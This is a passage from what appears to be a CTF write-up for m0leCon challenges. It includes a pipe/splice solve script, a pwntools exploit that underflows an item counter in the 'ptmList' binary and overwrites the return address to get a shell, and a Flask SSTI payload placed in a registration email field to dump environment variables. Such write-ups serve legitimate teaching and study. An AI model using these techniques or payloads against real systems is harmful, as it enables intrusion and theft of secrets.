</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;: &#34;</span>, str(size))
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;File content:&#34;</span>)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> io<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>write</span>(filename, data, padding): 
</span></span><span style=display:flex><span>    menu(<span style=color:#ae81ff>3</span>)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;filename: &#34;</span>, filename)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;: &#34;</span>, data)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;: &#34;</span>, str(padding))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 1. prepare_pipe (fill + drain)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 2. splice 128 bytes from priv</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 3. splice 22 bytes from conf to skip header</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 4. write to pipe</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 5. read flag</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pipe_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10000</span>
</span></span><span style=display:flex><span>write(<span style=color:#e6db74>&#34;conf&#34;</span>, <span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x40</span>, pipe_size <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x40</span>)
</span></span><span style=display:flex><span>read_file(<span style=color:#e6db74>&#34;priv&#34;</span>, <span style=color:#ae81ff>128</span>)
</span></span><span style=display:flex><span>read_file(<span style=color:#e6db74>&#34;conf&#34;</span>, <span style=color:#ae81ff>22</span>)
</span></span><span style=display:flex><span>write(<span style=color:#e6db74>&#34;conf&#34;</span>, <span style=color:#e6db74>&#34;flag</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>read_file(<span style=color:#e6db74>&#34;flag&#34;</span>, <span style=color:#ae81ff>127</span>)
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> read_file(<span style=color:#e6db74>&#34;flag&#34;</span>, <span style=color:#ae81ff>127</span>)[<span style=color:#ae81ff>1</span>:]<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>close()
</span></span></code></pre></div><h2 id=ptmlist>ptmList<a hidden class=anchor aria-hidden=true href=#ptmlist>#</a></h2><blockquote><p><strong>Author:</strong> @Alberto247</p><p><strong>Description:</strong> Thanks to ptmList you can keep your shopping list in order!</p><p><code>stty -icanon && socat - tcp:challs.m0lecon.it:8273 && stty icanon</code></p></blockquote><p>In this challenge we get an ncurses-like interface we have to interact with.
We can buy, move/merge, and delete items. Additionally we also have the <code>Secret gift</code> menu option to modify an item. More on this later.</p><p>We can have up to 50 items. Each item is represented as two bytes: an index
into a list of strings describing the item and a quantity. Free items are
represented as having an index and/or quantity of 0xff.</p><p>One thing we quickly noticed in <code>myListController()</code> is that there is a loop to
find the next free item, but it goes all the way up to 0xff (255) instead of 50.
The number of allocated items is stored in a variable and is updated when adding
or deleting items.</p><p>Due to the suspicious loop we assumed that there was a way to overflow or
underflow the number of items. There is a check to prevent more than 50 items
being allocated, so we started looking at the code to delete/move items. First
there is a check in <code>myListHandle()</code> that causes trouble for us when we try to
delete items when the number of items is zero, so we looked at move instead.</p><p>Moving two items will swap their positions (and keep the quantity of the second
item). If you try to move items of the same type, they will be merged instead of
moved. As long as the combined quantity doesn&rsquo;t exceed 99, the items can be
merged and one of them will be deleted. The deletion code moves all items
after our merged items one slot down, overwriting the second item we merged
with. Finally, the number of allocated items will be decremented.</p><p>The loop will stop once it encounters an item with an index or quantity
of 0xff. This is where the <code>Secret gift</code> menu comes into the picture. This
option allows us to set the quantity of an item to 0xff. If we change the
quantity of an item to 0xff, the merging code will stop looping when it reaches
this item. What happens if we try to merge an item with one that has a quantity
of 0xff? The quantities will be merged, effectively subtracting 1 from the
quantity of the first item. Then, when the code tries to move all other items
it will stop on the first iteration since the quantity is 0xff. Finally,
the number of items will be decreased by one. By abusing this behavior we can
keep merging one item with another one that has a quantity of 0xff, which will
decrease the quantity of the first item by 1 and also decrease the number of
items without removing any of them. Doing this a few times will underflow the
count to 0xff.</p><p>When the number of items is set to 0xff we can access data on the stack outside
the item array. We can write values by changing the quantity of items and by
moving and merging items.</p><p>Our attack plan: Ovewrite the two least significant bytes of the return address
on the stack with the address of <code>winfunc()</code>. The three lowest nibbles will
always be 0x5e7, so we decided to just bruteforce the last one. We ended up
buying the item 0x35 times, resulting in the two least significant bytes being
0x35e7.</p><ol><li>Buy wanted item(s) (to ovewrite least significant bytes of the return address)</li><li>Buy 2 x box of tissues</li><li>Secret gift on last box of tissues, setting its quantity to 0xff</li><li>Merge 4 times to underflow the number of items</li><li>Merge return address and with target, thus overwriting the return
address with <code>winfunc()</code></li></ol><p>After running the solve script a few times, you should get a shell.</p><p>Flag: <code>ptm{up_up_d0wn_down_l3ft_r1ght_lef7_r1ght_A_B_pwn}</code></p><p>Solve script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This exploit template was generated via:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $ pwn template --host challs.m0lecon.it --port 8273 ./shoppingList</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./shoppingList&#39;</span>)
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>HOST <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;challs.m0lecon.it&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> int(args<span style=color:#f92672>.</span>PORT <span style=color:#f92672>or</span> <span style=color:#ae81ff>8273</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>local</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> gdb<span style=color:#f92672>.</span>debug([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, gdbscript<span style=color:#f92672>=</span>gdbscript, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>remote</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    io <span style=color:#f92672>=</span> connect(host, port)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        gdb<span style=color:#f92672>.</span>attach(io, gdbscript<span style=color:#f92672>=</span>gdbscript)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> io
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> local(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> remote(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdbscript <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>continue
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span><span style=color:#f92672>.</span>format(<span style=color:#f92672>**</span>locals())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>down</span>():
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;s&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>up</span>():
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;w&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exit</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>3</span>):
</span></span><span style=display:flex><span>        io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;Exit&#34;</span>)
</span></span><span style=display:flex><span>        down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>buy</span>(idx, quantity):
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(idx):
</span></span><span style=display:flex><span>        down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(quantity):
</span></span><span style=display:flex><span>        down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>secret</span>(idx):
</span></span><span style=display:flex><span>    down()
</span></span><span style=display:flex><span>    down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(idx):
</span></span><span style=display:flex><span>        down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> start()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># buy item to set up for partial overwrite: 0x35e7</span>
</span></span><span style=display:flex><span>buy(<span style=color:#ae81ff>0xe7</span>, <span style=color:#ae81ff>0x35</span>)
</span></span><span style=display:flex><span>buy(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>buy(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>secret(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>down()
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>down()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># merge 4 times to underflow</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;m&#34;</span>)
</span></span><span style=display:flex><span>    down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;m&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># go down to return address</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>59</span>):
</span></span><span style=display:flex><span>    down()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># merge with first item we bought</span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;m&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>60</span>):
</span></span><span style=display:flex><span>    up()
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;m&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># go back to main menu</span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># exit -&gt; hopefully returns to winfunc()</span>
</span></span><span style=display:flex><span>down()
</span></span><span style=display:flex><span>down()
</span></span><span style=display:flex><span>down()
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h1 id=web>web<a hidden class=anchor aria-hidden=true href=#web>#</a></h1><h2 id=dumb-forum>Dumb Forum<a hidden class=anchor aria-hidden=true href=#dumb-forum>#</a></h2><blockquote><p><strong>Author:</strong> @italianconcerto</p><p><strong>Description:</strong> You&rsquo;re telling me you can&rsquo;t break such a simple forum?</p></blockquote><p>We are provided with a Flask application that contains a user system, but it is also possible to post public posts to the index page.</p><p>The flag is set in an environment variable in the <code>Dockerfile</code>. Knowing this we know our goal is to get access to the system environment variables.</p><p>After reading through the source code of the Flask application, we find the following route (<code>/profile</code>) where the user can edit and view its profile.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/profile&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#a6e22e>@login_required</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>profile</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;app/templates/profile.html&#39;</span>) <span style=color:#66d9ef>as</span> p:
</span></span><span style=display:flex><span>        profile_html <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    profile_html <span style=color:#f92672>=</span> profile_html <span style=color:#f92672>%</span> (current_user<span style=color:#f92672>.</span>username, current_user<span style=color:#f92672>.</span>email, current_user<span style=color:#f92672>.</span>about_me)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(current_user<span style=color:#f92672>.</span>about_me <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>):
</span></span><span style=display:flex><span>        current_user<span style=color:#f92672>.</span>about_me <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template_string(profile_html)
</span></span></code></pre></div><p>Flask has existing methods for rendering template, for example <a href=https://flask.palletsprojects.com/en/2.1.x/api/#flask.render_template><code>render_template</code></a>. However, in this case we see that the <code>profile</code> route reads the template file and uses string format instead to inject the <code>username</code>, <code>email</code>, and <code>about_me</code> of the user into the template.</p><p>In <code>profile.html</code> we can see this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>h5</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;card-title&#34;</span>&gt;Username: %s&lt;/<span style=color:#f92672>h5</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>p</span>&gt;Email: %s&lt;/<span style=color:#f92672>p</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>&gt;About me: %s&lt;/<span style=color:#f92672>p</span>&gt;
</span></span></code></pre></div><p>The form is parsed through <code>EditProfileForm</code>, which contains:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>EditProfileForm</span>(FlaskForm):
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> StringField(<span style=color:#e6db74>&#39;Username&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired()])
</span></span><span style=display:flex><span>    about_me <span style=color:#f92672>=</span> TextAreaField(<span style=color:#e6db74>&#39;About me&#39;</span>, validators<span style=color:#f92672>=</span>[Length(min<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>, max<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>)])
</span></span><span style=display:flex><span>    submit <span style=color:#f92672>=</span> SubmitField(<span style=color:#e6db74>&#39;Submit&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self, original_username, <span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs):
</span></span><span style=display:flex><span>        super(EditProfileForm, self)<span style=color:#f92672>.</span>__init__(<span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>original_username <span style=color:#f92672>=</span> original_username
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>validate_username</span>(self, username):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> <span style=color:#e6db74>&#34;}{&#34;</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> c <span style=color:#f92672>in</span> username<span style=color:#f92672>.</span>data:
</span></span><span style=display:flex><span>                abort(<span style=color:#ae81ff>400</span>)
</span></span><span style=display:flex><span>                <span style=color:#75715e>#raise ValidationError(&#39;Please use valid characters.&#39;)</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> username<span style=color:#f92672>.</span>data <span style=color:#f92672>!=</span> self<span style=color:#f92672>.</span>original_username:
</span></span><span style=display:flex><span>            user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(username<span style=color:#f92672>=</span>self<span style=color:#f92672>.</span>username<span style=color:#f92672>.</span>data)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> user <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>                abort(<span style=color:#ae81ff>409</span>)
</span></span><span style=display:flex><span>                <span style=color:#75715e>#raise ValidationError(&#39;Please use a different username.&#39;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>validate_about_me</span>(self, about_me):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> <span style=color:#e6db74>&#34;}{&#34;</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> c <span style=color:#f92672>in</span> about_me<span style=color:#f92672>.</span>data:
</span></span><span style=display:flex><span>                abort(<span style=color:#ae81ff>400</span>)
</span></span></code></pre></div><p>The form validates the <code>username</code> and <code>about_me</code> fields, and checks if they contains either of <code>}{</code> (which are typically used with <a href=https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection>SSTI (Server Side Template Injection)</a>. <em>But</em> the form does not allow editing the <code>email</code> field of the user.</p><p>We find another form, <code>RegistrationForm</code> which is used during registration, and it is here, and only here, the email of the user is set. The validation of the <code>email</code> does however not include the <code>}{</code> validation, which means we can register with an email and potentially perform a SSTI.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>RegistrationForm</span>(FlaskForm):
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> StringField(<span style=color:#e6db74>&#39;Username&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired()])
</span></span><span style=display:flex><span>    email <span style=color:#f92672>=</span> StringField(<span style=color:#e6db74>&#39;Email&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired(), Email()])
</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> PasswordField(<span style=color:#e6db74>&#39;Password&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired()])
</span></span><span style=display:flex><span>    password2 <span style=color:#f92672>=</span> PasswordField(<span style=color:#e6db74>&#39;Repeat Password&#39;</span>, validators<span style=color:#f92672>=</span>[DataRequired(), EqualTo(<span style=color:#e6db74>&#39;password&#39;</span>)])
</span></span><span style=display:flex><span>    submit <span style=color:#f92672>=</span> SubmitField(<span style=color:#e6db74>&#39;Register&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>validate_username</span>(self, username):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> <span style=color:#e6db74>&#34;}{&#34;</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> c <span style=color:#f92672>in</span> username<span style=color:#f92672>.</span>data:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>raise</span> ValidationError(<span style=color:#e6db74>&#39;Please use valid characters.&#39;</span>)
</span></span><span style=display:flex><span>        user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(username<span style=color:#f92672>=</span>username<span style=color:#f92672>.</span>data)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> user <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>raise</span> ValidationError(<span style=color:#e6db74>&#39;Please use a different username.&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>validate_email</span>(self, email):
</span></span><span style=display:flex><span>        user <span style=color:#f92672>=</span> User<span style=color:#f92672>.</span>query<span style=color:#f92672>.</span>filter_by(email<span style=color:#f92672>=</span>email<span style=color:#f92672>.</span>data)<span style=color:#f92672>.</span>first()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> user <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>raise</span> ValidationError(<span style=color:#e6db74>&#39;Please use a different email address.&#39;</span>)
</span></span></code></pre></div><p>The email field does however include an email validator:
<code>email = StringField('Email', validators=[DataRequired(), Email()])</code></p><p>We see that this validator comes from <code>wtforms</code>:
<code>from wtforms.validators import ValidationError, DataRequired, Email, EqualTo</code></p><p>Looking into the source code of <a href=https://wtforms.readthedocs.io/en/2.3.x/_modules/wtforms/validators/#Email>the wtforms validator</a>, we see that it uses the <a href=https://pypi.org/project/email-validator/><code>email-validator</code></a> library.</p><p>By looking at the <a href=https://en.wikipedia.org/wiki/Email_address#Local-part>specification</a> for the local-part of an email, we see that the following characters are allowed in an email:</p><blockquote><ul><li>uppercase and lowercase Latin letters A to Z and a to z</li><li>digits 0 to 9</li><li>printable characters !#$%&&rsquo;*+-/=?^_`{|}~</li><li>dot ., provided that it is not the first or last character and provided also that it does not appear consecutively (e.g., <a href=mailto:John..Doe@example.com>John..Doe@example.com</a> is not allowed).[5]</li><li>space and special characters &ldquo;(),:;&lt;>@[] are allowed with restrictions (they are only allowed inside a quoted string, as described in the paragraph below, and in that quoted string, any backslash or double-quote must be preceded once by a backslash);
comments are allowed with parentheses at either end of the local-part; e.g., john.smith(comment)@example.com and (comment)john.smith@example.com are both equivalent to john.smith@example.com.</li></ul></blockquote><p>This means that an email such as <code>{{self.__dict__}}@a.a</code> will be considered a valid email.</p><p>We now know that our goal is to perform a SSTI on the email field.</p><p>We can use the <a href=https://flask.palletsprojects.com/en/1.1.x/api/#flask.get_flashed_messages><code>get_flashed_messages</code></a> of Flask to get the <code>__globals__</code> of the application. And with this we generate a payload that returns the environment variables of the system, resulting in the flag.
<code>{{get_flashed_messages.__globals__.os.environ}}@z.c</code></p><pre tabindex=0><code>Email: environ({
  &#34;PATH&#34;:&#34;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;,
  &#34;HOSTNAME&#34;:&#34;35250adbc3f0&#34;,
  &#34;LANG&#34;:&#34;C.UTF-8&#34;,
  &#34;GPG_KEY&#34;:&#34;A035C8C19219BA821ECEA86B64E628F8D684696D&#34;,
  &#34;PYTHON_VERSION&#34;:&#34;3.10.4&#34;,
  &#34;PYTHON_PIP_VERSION&#34;:&#34;22.0.4&#34;,
  &#34;PYTHON_SETUPTOOLS_VERSION&#34;:&#34;58.1.0&#34;,
  &#34;PYTHON_GET_PIP_URL&#34;:&#34;https://github.com/pypa/get-pip/raw/38e54e5de07c66e875c11a1ebbdb938854625dd8/public/get-pip.py&#34;,
  &#34;PYTHON_GET_PIP_SHA256&#34;:&#34;e235c437e5c7d7524fbce3880ca39b917a73dc565e0c813465b7a7a329bb279a&#34;,
  &#34;FLASK_APP&#34;:&#34;main.py&#34;,
  &#34;FLAG&#34;:&#34;ptm{d1d_u_f1nd_th3_r1ckr0ll?}&#34;,
  &#34;HOME&#39;:&#34;/home/app&#34;}
)@a.a
